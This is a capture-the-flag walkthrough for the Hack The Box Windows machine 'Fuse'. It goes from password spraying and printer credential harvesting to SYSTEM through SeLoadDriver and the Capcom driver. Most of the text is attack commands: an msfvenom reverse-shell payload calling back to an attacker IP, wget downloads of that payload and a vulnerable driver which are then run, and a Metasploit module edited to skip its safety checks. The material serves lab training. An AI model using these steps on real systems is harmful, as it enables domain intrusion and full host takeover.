@@ -1,0 +1,260 @@
+Fuse
+
+26st October 2020 / Document No D20.100.71
+Prepared By: Cube0x0
+Machine Author(s): egre55
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Fuse is a medium difficulty Windows box made that starts with enumeration of a print job logging
+application From this we can harvest usernames and possible passwords for use in a password
+spray attack. This successfully identifies that three domain accounts have the same password set,
+although their passwords are expired. We can use the Windows API to set a new password. With
+valid credentials we can enumerate shared printers, which yields credentials for the printer
+service account. This account can be used to establish a WinRM shell on the machine. From this
+foothold we can abuse the SeLoadDriver privilege and get a shell as SYSTEM.
+
+Skills Required
+
+      Basic Windows Knowledge
+
+Skills Learned
+
+      Printer Enumeration
+      Reset Expired Passwords
+      SeLoadDriver Privilege Abuse
+      Password Spraying
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.193 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.193
+
+Nmap reveals that we are looking at a Domain Controller (DC) for the fabricorp.local domain.
+Apart from the standard ports exposed by domain controllers, we note that ports 5985 (Windows
+Remote Management) and 80 (Internet Information Services) are available. The server version is
+Windows Server 2016 and the OS Build is 14393.
+Navigating to port 80 in the browser results in a redirect to the URL below.
+
+   http://fuse.fabricorp.local/papercut/logs/html/index.htm
+We can add the DC as a name server in /etc/resolv.conf and refresh the web page.
+
+   cat /etc/resolv.conf
+   nameserver 10.10.10.193
+   <SNIP>
+This reveals the PaperCut Print Logger application, which is used for auditing print jobs. The page
+contains a list of print jobs grouped by date.
+
+Clicking on the first instance 29 May 2020 reveals the print jobs below. Some interesting
+information can be gained from this, such as the company username format (first letter of the
+first name followed by the surname), internal hostname format, possible job/role functions, and
+the presence of a printer called HP-MFT01 . We can collect 3 usernames from this page ( pmerton ,
+tlavel , and bnielson ) and save them to users.txt locally.
+
+The instance of the 30 May 2020 reveals another username sthompson , which we add to our
+users.txt file. We also see a Word document with the curious title Fabricorp01 . It's possible that
+someone typed a password into a Word document, saved it and printed it off. Upon saving,
+Microsoft Word uses the first sentence in a document as the suggested filename.
+Let's take our four users and potential password, and perform a password spray using
+CrackMapExec.
+
+   crackmapexec smb 10.10.10.193 -d fabricorp -u users.txt -p 'Fabricorp01'
+
+This doesn't reveal any success cases, although it's worth noting that
+STATUS_PASSWORD_MUST_CHANGE is not a failure case. We have the correct password for the
+tlavel , bnielson and bhult accounts, although the password for the accounts has expired
+and needs to be changed before logging in. It seems that the IT Helpdesk are setting common
+passwords for their users.
+Foothold
+
+In the absence of RDP (which will prompt the user to change their password), we can use
+PowerShell to interact with the Windows NET API module NetApi32, and change the password
+programmatically. This article is found upon searching for how a user can change their own
+expired password without RDP, and the following code is taken directly from it.
+
+   $username = 'bnielson'
+   $dc = 'fuse.fabricorp.local'
+   $old = 'Fabricorp01'
+   $new = 'S0meVeryLongPa5s!'
+
+   $code = @'
+   [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
+   public static extern bool NetUserChangePassword(string domain, string username,
+   string oldpassword, string newpassword);
+   '@
+
+   $NetApi32 = Add-Type -MemberDefinition $code -Name 'NetApi32' -Namespace 'Win32'
+   -PassThru
+   $NetApi32::NetUserChangePassword($dc, $username, $old, $new)
+
+Note: If we want to change the password than once, we'll have to choose a new one each time
+owing to password history enforcement in the domain. The password is reverted every two
+minutes.
+
+Disconnect the VPN on the Linux machine and hop over to a Windows machine. On the Windows
+machine, connect the VPN, and execute the code above in the Windows PowerShell ISE. We
+receive confirmation that the password for bnielson was successfully changed if the last
+command returns False .
+
+Still from the Windows machine, we can navigate to the UNC path \\10.10.10.193\ and are
+presented with an authentication box as expected. Input the username bnielson with the new
+password set.
+This reveals the standard domain controller shares below, and also the printer hp-mft01 .
+
+Let's connect to the printer by right-clicking on the object and selecting Connect .
+
+This downloads the printer driver and sets up the local printer object. Open "Printers &
+Scanners", right-click on the newly added printer and click "Properties". In corporate settings, the
+main printers are often multifunction devices that also perform other functions such as faxing
+and scanning. In this case, the "scan to docs" feature requires a password (possibly for the service
+account), and this has been added to the printer object to help the users. We should also note
+that this password seems generic for service accounts in general.
+We can also enumerate printer properties using PowerShell.
+   Get-Printer -Name \\10.10.10.193\hp-mft01 | Format-List
+
+Set the password for bnielson again, then disconnect the VPN on the Windows machine and
+jump back to Linux. Edit /etc/resolv.conf again, comment out the added name server entry
+and re-connect the VPN.
+
+   cat /etc/resolv.conf
+   #nameserver 10.10.10.193
+   nameserver 8.8.8.8
+We can use the bnielson credentials to enumerate domain users with Windapsearch.
+   git clone https://github.com/ropnop/windapsearch
+   pip install python-ldap
+   cd windapsearch
+   python windapsearch.py -u "FABRICORP\bnielson" --dc-ip 10.10.10.193 -U
+Save the users to users.txt and run CrackMapExec to spray the password that we got from the
+printer.
+
+   crackmapexec smb 10.10.10.193 -d fabricorp -u users.txt -p '$fab@s3Rv1ce$1'
+
+This reveals that svc-print is also configured with this password.
+Now we can use windapsearch again to enumerate group membership of our compromised
+user.
+
+   windapsearch.py -u "FABRICORP\bnielson" --dc-ip 10.10.10.193 -U --attrs
+   cn,memberof
+Next we can also check the nested membership of our compromised user
+   windapsearch.py -u "FABRICORP\bnielson" --dc-ip 10.10.10.193 -G --attrs
+   cn,memberof
+
+The IT_Accounts group has membership of the Remote Management Users group, which grants
+all members of IT_Accounts with permissions to connect to the server remotely using WinRM.
+
+As Nmap revealed that port 5985 was open, we can connect using evil-winrm using svc-
+print:$fab@s3Rv1ce$1
+Privilege Escalation
+
+The whoami /groups command reveals that we are a member of the Print Operators group.
+Membership of this group bestows the SeLoadDriver privilege on its members. The command
+whoami /priv reveals that this privilege is already enabled in our logon token. We can get a
+better understanding of the SeLoadDriver privilege by reading this post by Microsoft which
+describes the vulnerability and impact associated with this privilege:
+
+   Device drivers run as highly privileged code. A user who has the Load and unload
+   device drivers user right could unintentionally install malware that masquerades
+   as a device driver.
+
+So far we know that we have the ability to load drivers. However, a quick Google search of this
+exploitation vector reveals a Tarlogic Security post that shows how a vulnerable driver can be
+loaded, which can be leveraged to get RCE. It also mentions that this vector is no longer
+exploitable in the latest Windows 10 or Windows 2016 versions.
+
+   All tests have been performed in a Windows 10 Version 1708 environment.
+   As of Windows 10 Version 1803, NTLoadDriver seems to forbid references to
+   registry keys under HKEY_CURRENT_USER.
+It also isn't exploitable on Windows Server 2019. However, referring back to our Nmap scan, we
+see that the machine is Windows Server 2016, OS Build 14393. Privilege escalation using the
+SeLoadDriver privilege is still possible in this build version.
+Windows Defender is not enabled on the machine so we don't have to care about any evasion.
+   get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
+We are going to load the same vulnerable driver as the blog post and use Metasploit to exploit it.
+The Metasploit Capcom exploit requires a modification before we can use it so let's open the
+exploit in an editor.
+
+   pico /usr/share/metasploit-
+   framework/modules/exploits/windows/local/capcom_sys_exec.rb
+
+Next, comment out the section beginning with check_result , using the multi-line comment tags
+=begin and =end . These tags should not be indented.
+
+   =begin
+          check_result = check
+          if check_result == Exploit::CheckCode::Safe || check_result ==
+
+   Exploit::CheckCode::Unknown
+              fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
+
+          end
+
+          if sysinfo['Architecture'] == ARCH_X64
+              if session.arch == ARCH_X86
+                 fail_with(Failure::NoTarget, 'Running against WOW64 is not supported,
+
+   please get an x64 session')
+              end
+
+              if target.arch.first == ARCH_X86
+                 fail_with(Failure::NoTarget, 'Session host is x64, but the target is
+
+   specified as x86')
+              end
+
+          end
+   =end
+
+Next, start Metasploit and set up the multi/hander as follows.
+
+   use multi/handler
+   set payload windows/x64/meterpreter/reverse_tcp
+   set LHOST tun0
+   set LPORT 4444
+   exploit -j
+
+Then create a 64-bit Meterpreter reverse TCP payload. The architecture is important because the
+vulnerable Capcom driver exploit is only possible in 64-bit sessions.
+
+   msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp
+   LHOST=10.10.14.2 LPORT=4444 -f exe > msiexec.exe
+Now we stand up a Python web server in our virtual machine, download the binary to the server
+and execute it using the start-process PowerShell cmdlet. After executing the binary, we
+receive a Meterpreter session as expected.
+
+   wget http://10.10.14.2/msiexec.exe -O msiexec.exe
+   start-process .\msiexec.exe
+Next, we need to load the vulnerable Capcom driver, which can be exploited with the above
+module. Safe boot is not enabled in the VM BIOS, which allows us to load signed third-party
+drivers on the system.
+In an attempt to defeat game-cheaters, Capcom attempted to build a Sony-style rootkit into their
+driver. However, the implementation was poor and it contained multiple vulnerabilities, including
+one that allowed userland code to be executed in the kernel.
+We can download and compile eoploaddriver.cpp, and use it to install the vulnerable driver, but
+first we need to install Visual Studio then Build Tools for Visual Studio.
+After installation we can launch a Visual Studio developer tools console (x86-x64) to compile the
+binary using the following command. The /DUNICODE flag will allow for Unicode output and we'll
+import the external shell32.lib library specified at the end of the command.
+   cl.exe /DUNICODE /D_UNICODE eoploaddriver.cpp shell32.lib
+
+The binary is successfully compiled. Next, download the NirSoft tool DriverView and the
+vulnerable Capcom driver. Transfer the three files to the box under C:\test .
+   wget http://10.10.14.2/eoploaddriver.exe -O C:\test\eoploaddriver.exe
+   wget http://10.10.14.2/Capcom.sys -O C:\test\Capcom.sys
+   wget http://10.10.14.2/DriverView.exe -O C:\test\DriverView.exe
+First, execute eoploaddriver.exe , in order to load the vulnerable driver.
+   .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\Capcom.sys
+
+This runs and the status code 00000000 is returned, which indicates that the driver was
+successfully loaded. We can use DriverView.exe to confirm this.
+
+   .\DriverView.exe /stext drivers.txt
+   gc .\drivers.txt | Select-String -pattern Capcom
+
+Finally, return to Metasploit and run the exploit.
+   use exploit/windows/local/capcom_sys_exec
+   set SESSION 1
+   LHOST tun0
+   run
+This is successful, and we receive a shell as SYSTEM.
+
